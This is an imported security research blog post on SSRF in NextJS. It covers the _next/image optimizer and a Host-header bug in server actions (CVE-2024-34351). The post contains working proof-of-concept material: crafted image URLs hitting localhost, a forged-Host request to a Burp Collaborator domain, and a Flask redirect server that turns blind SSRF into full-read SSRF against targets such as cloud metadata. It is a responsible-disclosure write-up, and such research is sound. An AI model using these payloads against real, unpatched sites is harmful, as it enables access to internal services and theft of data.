---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-05-09_digging-for-ssrf-in-nextjs-apps.md
original_filename: 2024-05-09_digging-for-ssrf-in-nextjs-apps.md
title: Digging for SSRF in NextJS apps
category: documents
detected_topics:
- ssrf
- api-security
- supply-chain
- sso
- xss
- command-injection
tags:
- imported
- documents
- ssrf
- api-security
- supply-chain
- sso
- xss
- command-injection
language: en
raw_sha256: b3174ec4d9fc97ba23787f1ad3a7b4bed31e326056707eba748aaf0b86b09710
text_sha256: 2215626769a106946c4da5db1507d3c7dfa407c1e048ae9f8de0a466a6c93250
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: true
---

# Digging for SSRF in NextJS apps

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-05-09_digging-for-ssrf-in-nextjs-apps.md
- Source Type: markdown
- Detected Topics: ssrf, api-security, supply-chain, sso, xss, command-injection
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: True
- Raw SHA256: `b3174ec4d9fc97ba23787f1ad3a7b4bed31e326056707eba748aaf0b86b09710`
- Text SHA256: `2215626769a106946c4da5db1507d3c7dfa407c1e048ae9f8de0a466a6c93250`


## Content

---
title: "Digging for SSRF in NextJS apps"
url: "https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps"
final_url: "https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps"
authors: ["Adam Kues (@hash_kitten)", "Shubham Shah (@infosec_au)"]
programs: ["Vercel (NextJS)"]
bugs: ["SSRF", "Security code review"]
publication_date: "2024-05-09"
added_date: "2024-05-11"
source: "pentester.land/writeups.json"
original_index: 292
---

[Research Notes](/resources/research)

Security Research

May 9, 2024

# Digging for SSRF in NextJS apps

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

If you want to design a mostly static, modern landing page for your brand new business, what do you do? Ten years ago, it felt like every company was using a heavyweight CMS like Wordpress. As a hacker, the attack surface of CMS solutions is well understood. It feels like every day that some critical vulnerability is found in a CMS or CMS plugin.

However, in the modern era, companies are increasingly moving to more lightweight solutions. The past few years has seen an explosion of popularity in 'static' site generators, such as Nuxt, Hugo, and Gatsby. Perhaps the most popular of all is NextJS, which despite often being used for serving simple static content, has a plethora of server side features enabled by default. At Assetnote, we encounter sites running NextJS extremely often; in this blog post we will detail some common misconfigurations we find in NextJS websites, along with a vulnerability we found in the framework.

### The _next/image Component  

NextJS has an image optimization component [built in](https://nextjs.org/docs/pages/api-reference/components/image) and enabled by default. The idea is straightforward; if you have a large image <span class="code_single-line">duck.jpg</span> which you want to serve in a smaller size, or serve in a dynamic size, it would be wasteful to send the (possibly multi megabyte) image to the client and resize it using HTML; instead, you can write something in your React like:
  
  
  <Image
  src="/duck.jpg"
  width={256}
  quality={75}
  alt="Picture of a duck"
  />
  

And it will be served to the client at the correct size. In addition, it can be cached, meaning the server does not have to resize the image on every request.

How does this work behind the scenes? In reality, NextJS exposes an api endpoint <span class="code_single-line">_next/image</span>, which can then be used like follows:
  
  
  https://example.com/_next/image?url=/duck.jpg&w=256&q=75

The Image component simply crafts a request like this and places it inside an ordinary <span class="code_single-line">img</span> tag. When you visit this URL for the first time, NextJS makes a request to <span class="code_single-line">//localhost/duck.jpg</span>, and, assuming an image exists at that url, resizes it using a server side image manipulation library before returning it to the user.

Of course, it's common to want to serve images from other domains. NextJS provides the <span class="code_single-line">remotePatterns</span> functionality in the <span class="code_single-line">next.config.js</span> file to do just that; by specifying a config item like:
  
  
  images: {
  remotePatterns: [
  {
  protocol: 'https',
  hostname: 'cdn.example.com',
  },
  {
  protocol: 'https',
  hostname: 'third-party.com',
  },
  ],
  },
  

You can now load images from <span class="code_single-line">cdn.example.com</span> and <span class="code_single-line">third-party.com</span>:
  
  
  https://example.com/_next/image?url=https://cdn.example.com/i/rabbit.png&w=256&q=75
  

If you were a developer and you wanted to load an image from any site, you may simply whitelist every URL:
  
  
  images: {
  remotePatterns: [
  {
  protocol: "https",
  hostname: "**",
  },
  {
  protocol: "http",
  hostname: "**",
  },
  ],
  },
  

This may seem ludicrous, but [it's not that uncommon](https://github.com/search?q=%22hostname%3A+%5C%22**%5C%22%22+path%3Anext.config.js&type=code), especially since it's not clear that this is dangerous. However, this opens you up to a blind SSRF attack - you can simply load any local URL like:
  
  
  https://example.com/_next/image?url=https://localhost:2345/api/v1/x&w=256&q=75

If the upstream response is a valid image, it will be passed to the user. There are a couple of rare conditions that this can be escalated further:

\- If the version of NextJS is old, or <span class="code_single-line">dangerouslyAllowSVG</span> is set to true, you can link to an SVG url hosted on your domain, leading to XSS.

\- If the version of NextJS is old, or <span class="code_single-line">dangerouslyAllowSVG</span> is set to true, you can leak the full content of XML responses via SSRF. This is because NextJS uses sniffing to determine the content type of the response even if a <span class="code_single-line">Content-Type</span> header is provided, and to check for SVG NextJS simply checks the response starts with <span class="code_single-line">&#x3c;&#x3f;&#x78;&#x6d;&#x6c;</span>.

\- If any internal host does not respond with a <span class="code_single-line">Content-Type</span>, the full response will also be leaked. This is unlikely but sometimes happens with misconfigured proxies or the like.

A more common scenario is that some specific domains are whitelisted. However, the image renderer follows redirects. Thus if you were to find any open redirect on a whitelisted domain, you can turn this into a blind SSRF. For example, suppose <span class="code_single-line">third-party.com</span> was whitelisted and you found an open redirect at <span class="code_single-line">third-party.com/logout?url=foo</span>. You could then hit an internal server with SSRF with a request like:
  
  
  https://example.com/_next/image?url=https://third-party.com/logout%3furl%3Dhttps%3A%2F%2Flocalhost%3A2345%2Fapi%2Fv1%2Fx&w=256&q=75

‍

### Digging Deeper - SSRF in Server Actions  

While many people think of NextJS as a 'client side' library, NextJS provides a fully featured server side framework with Server Actions. This allows writing JS code that will be executed asynchronously on the server when called. This allows developers to create APIs directly within NextJS without having to have a separate backend, and because it's part of the same codebase you get all the type safety associated with using TypeScript. However, this server side functionality provides a large attack surface for bugs.  

While auditing the NextJS source, we came across something interesting. If you call a server action and it responds with a redirect, it calls the following function:  

  
  
  async function createRedirectRenderResult(
  req: IncomingMessage,
  res: ServerResponse,
  redirectUrl: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
  ) {
  res.setHeader('x-action-redirect', redirectUrl)
  // if we're redirecting to a relative path, we'll try to stream the response
  if (redirectUrl.startsWith('/')) {
  const forwardedHeaders = getForwardedHeaders(req, res)
  forwardedHeaders.set(RSC_HEADER, '1')
  
  const host = req.headers['host']
  const proto =
  staticGenerationStore.incrementalCache?.requestProtocol || 'https'
  const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
  // .. snip ..
  try {
  const headResponse = await fetch(fetchUrl, {
  method: 'HEAD',
  headers: forwardedHeaders,
  next: {
  // @ts-ignore
  internal: 1,
  },
  })
  
  if (
  headResponse.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER
  ) {
  const response = await fetch(fetchUrl, {
  method: 'GET',
  headers: forwardedHeaders,
  next: {
  // @ts-ignore
  internal: 1,
  },
  })
  // .. snip ..
  return new FlightRenderResult(response.body!)
  }
  } catch (err) {
  // .. snip ..
  }
  }
  
  return RenderResult.fromStatic('{}')
  }
  

What is interesting is that instead of returning the redirect directly to the client, if the redirect starts with <span class="code_single-line">/</span> (for example, a redirect to <span class="code_single-line">/login</span>) the server will fetch the result of the redirect __server side__ , then return it back to the client. However, looking closely, we see that the Host header is taken from the client:
  
  
  const host = req.headers['host']
  const proto =
  staticGenerationStore.incrementalCache?.requestProtocol || 'https'
  const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
  

This means that if we forge a host header pointing to an internal host, NextJS will try and fetch the reponse from that host instead of the app itself, leading to an SSRF.

To recap, to be vulnerable to this SSRF, we require that:

\- A server action is defined;

\- The server action redirects to a URL starting with <span class="code_single-line">/</span>;

\- We are able to specify a custom Host header while accessing the application.

Let's run through a simple example locally. Suppose we have an app with a simple search function that only works if the user is logged in:
  
  
  "use server";
  
  import { redirect } from "next/navigation";
  
  export const handleSearch = async (data: FormData) => {
  if (!userIsLoggedIn()) {
  redirect("/login");
  return;
  }
  // .. do other stuff ..
  };
  
  function userIsLoggedIn() {
  return false;
  }
  

‍

If we send a request to this search endpoint via the UI, we can intercept the request and see its structure:
  
  
  POST /en/search/hello HTTP/1.1
  Host: localhost:3000
  Content-Length: 375
  Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22en%22%2C%7B%22children%22%3A%5B%22search%22%2C%7B%22children%22%3A%5B%5B%22search%22%2C%22hello%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%5D
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  Accept: text/x-component
  Next-Action: ***REDACTED-SUSPECT-TOKEN***  Origin: http://localhost:3000
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
  Connection: close
  
  < ... snip ... >
  
  

The important thing here is the <span class="code_single-line">Next-Action</span> ID. This is used by NextJS to uniquely identify the action we want to take. In fact, the URL and path does not matter at all - as long as we pass the <span class="code_single-line">Next-Action</span> header, we'll trigger the action.

To trigger the bug, let's use this <span class="code_single-line">Next-Action</span> ID to create a minimal PoC:  

  
  
  POST /x HTTP/1.1
  Host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
  Content-Length: 4
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
  Next-Action: ***REDACTED-SUSPECT-TOKEN***  Connection: close
  
  {}
  

Note that here, we have changed our host to our Burp Collaborator instance. And indeed, we can see we get a ping back - here's the request that NextJS sends to us:
  
  
  HEAD /login HTTP/1.1
  host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
  connection: close
  cache-control: no-cache, no-store, max-age=0, must-revalidate
  cookie: ; undefined
  next-action: ***REDACTED-SUSPECT-TOKEN***  rsc: 1
  user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
  vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url
  x-action-redirect: /login
  x-action-revalidated: [[],0,0]
  x-forwarded-for: ::ffff:127.0.0.1
  x-forwarded-host: kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
  x-forwarded-port: 3000
  x-forwarded-proto: http
  accept: */*
  accept-language: *
  sec-fetch-mode: cors
  accept-encoding: gzip, deflate
  

We have a working blind SSRF! However, we can do better. Let's revisit the logic of exactly what requests NextJS makes:
  
  
  try {
  const headResponse = await fetch(fetchUrl, {
  method: 'HEAD',
  headers: forwardedHeaders,
  next: {
  // @ts-ignore
  internal: 1,
  },
  })
  
  if (
  headResponse.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER
  ) {
  const response = await fetch(fetchUrl, {
  method: 'GET',
  headers: forwardedHeaders,
  next: {
  // @ts-ignore
  internal: 1,
  },
  })
  // .. snip ..
  return new FlightRenderResult(response.body!)
  }
  } catch (err) {
  // .. snip ..
  }
  

The logic is as follows:  

\- The server first does a preflight HEAD request to the URL.

\- If the preflight returns a <span class="code_single-line">Content-Type</span> header of <span class="code_single-line">RSC_CONTENT_TYPE_HEADER</span>, which is <span class="code_single-line">text/x-component</span>, then NextJS makes a GET request to the same URL.

\- The content of that GET request is then returned in the response.

Of course, it's unlikely that any of our SSRF targets (like cloud metadata endpoints) would return that content type, so what can be done? We can satisfy these checks and turn our SSRF into a full read as follows:  

\- Set up a server that takes requests on any path.

\- On any HEAD request, return a 200 with <span class="code_single-line">Content-Type: text/x-component</span>.

\- On a GET request, return a 302 to our intended SSRF target (such as <span class="code_single-line">metadata.internal</span> or the like)

\- When NextJS fetches from our server, it will satisfy the preflight check on our HEAD request, but will follow the redirect on GET, giving us a full read SSRF!

Here's a simple Flask example:
  
  
  from flask import Flask, Response, request, redirect
  app = Flask(__name__)
  
  @app.route('/', defaults={'path': ''})
  @app.route('/<path:path>')
  def catch(path):
  if request.method == 'HEAD':
  resp = Response("")
  resp.headers['Content-Type'] = 'text/x-component'
  return resp
  return redirect('https://example.com')
  
  

Changing our <span class="code_single-line">Host</span> header to point to our malicious Flask server then gives us the full content of <span class="code_single-line">example.com</span>, as expected:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/662843388988fa96b13fc00b_image%20\(10\).png)

We reported this SSRF to NextJS and it was fixed in <span class="code_single-line">v14.1.1</span>. 

This vulnerability was assigned CVE-2024-34351 and you can find the advisory here: <https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g>

### Conclusion

As the world increasingly adopts static single-page apps and frameworks, it may be tempting to overlook testing them. The term 'static' might imply a lack of functionality and minimal risk. Yet, these frameworks often rely on numerous underlying APIs and logic, presenting a considerable attack surface.

Ultimately, vulnerabilities such as the one above highlight that modern frameworks are not a complete solution to the security challenges faced by earlier CMS technologies. 

Written by:

Adam Kues

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
